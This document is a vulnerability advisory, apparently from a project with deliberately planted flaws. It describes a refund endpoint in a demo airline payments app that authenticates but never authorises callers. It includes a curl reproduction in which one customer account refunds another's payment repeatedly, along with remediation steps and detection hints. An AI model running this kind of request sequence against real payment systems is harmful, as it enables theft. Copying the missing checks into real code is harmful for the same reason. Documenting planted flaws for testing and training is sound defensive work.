# VULN-052 — Missing authorisation on the refund endpoint

| Field | Value |
|-------|-------|
| ID | VULN-052 |
| Domain | payments |
| CWE | CWE-862 (Missing Authorization) / CWE-639 (Authorization Bypass Through User-Controlled Key) |
| OWASP Top 10 (2021) | A01:2021 – Broken Access Control |
| Severity | Critical |
| Location | `backend/app/routers/payments.py:165-201` (`POST /api/payments/{payment_id}/refund`) |
| Introduced by | Workstream 4 — payments |

## Description

`POST /api/payments/{payment_id}/refund` depends only on `current_user`, so it authenticates
the caller but never authorises them:

* no `require_roles("agent", "ops", "admin")` dependency — refunding is a privileged
  contact-centre action, yet any `customer` token is accepted (missing **function-level**
  authorisation);
* no ownership check on `payment.user_id` — `payment_id` is an incrementing integer supplied by
  the caller, so any payment belonging to any passenger can be refunded (**object-level**
  authorisation / IDOR);
* no amount validation against already-refunded totals, so the same payment can be refunded
  repeatedly for its full value.

Compare `GET /api/payments/{payment_id}`, which *does* check
`payment.user_id != user.id and user.role not in PRIVILEGED_ROLES` — the refund path simply
omits it.

## Reproduction

```bash
# victim's payment
VICTIM=$(curl -s -X POST http://127.0.0.1:8000/api/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"customer@iberia.demo","password":"Iberia2026!"}' | python3 -c 'import json,sys;print(json.load(sys.stdin)["access_token"])')
ID=$(curl -s -X POST http://127.0.0.1:8000/api/payments/authorise -H "Authorization: Bearer $VICTIM" \
  -H 'Content-Type: application/json' \
  -d '{"pnr":"IBDEMO","card_number":"4111111111111111","card_holder":"Lucia Fernandez","expiry":"12/29","cvv":"123"}' \
  | python3 -c 'import json,sys;print(json.load(sys.stdin)["id"])')

# unrelated, low-privilege attacker refunds it
ATTACKER=$(curl -s -X POST http://127.0.0.1:8000/api/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"frequent@iberia.demo","password":"Iberia2026!"}' | python3 -c 'import json,sys;print(json.load(sys.stdin)["access_token"])')
curl -s -X POST http://127.0.0.1:8000/api/payments/$ID/refund -H "Authorization: Bearer $ATTACKER" \
  -H 'Content-Type: application/json' -d '{"amount_eur":250,"reason":"not mine"}'

# and again, and again — no cumulative cap
curl -s -X POST http://127.0.0.1:8000/api/payments/$ID/refund -H "Authorization: Bearer $ATTACKER" \
  -H 'Content-Type: application/json' -d '{"amount_eur":250,"reason":"again"}'
```

Expected insecure result: HTTP 201 with a `Refund` object each time, and the victim's payment
flipped to `refunded`, despite the attacker owning neither the payment nor a privileged role.

## Blast radius

Direct monetary loss: an attacker enumerates `payment_id` from 1 upward and refunds every
transaction on the platform, unbounded and repeatedly. Bookings show as refunded while
passengers still hold tickets, corrupting revenue accounting and the finance reconciliation
feed. Any registered account is sufficient.

## Intended remediation

* Add `user: User = Depends(require_roles("agent", "ops", "admin"))` to the endpoint.
* For self-service refunds, verify `payment.user_id == user.id` before proceeding.
* Validate `amount_eur` against `payment.amount_eur - payment.refunded_eur` and reject the
  excess; make the check transactional to avoid races.
* Write the actor, payment and amount to the audit log and add a regression test for the
  cross-tenant case.

## Detection hints

* Grep routers for state-changing endpoints that use `Depends(current_user)` without a
  `require_roles(` sibling, and for handlers that load by primary key without comparing
  `user_id`.
* Log signature: `"msg": "payment refunded"` where `actor` differs from the payment's owner.
* Test demonstrating the flaw: `backend/tests/test_payments.py::test_planted_vuln_052_refund_has_no_authorisation_check`.
